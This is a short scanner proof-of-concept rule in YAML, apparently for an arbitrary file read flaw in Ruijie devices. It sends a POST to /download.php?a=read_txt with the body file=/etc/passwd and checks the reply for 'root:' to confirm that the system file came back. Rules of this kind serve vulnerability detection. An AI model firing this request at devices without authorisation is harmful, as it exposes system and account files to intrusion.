name: poc-yaml-ruijie-anyfile-read
rules:
  - method: POST
    path: /download.php?a=read_txt
    follow_redirects: false
    body: |
      file=/etc/passwd
    expression: |
      response.status == 200  && r'root:'.bmatches(response.body) && response.body.bcontains(b'"status":true,')
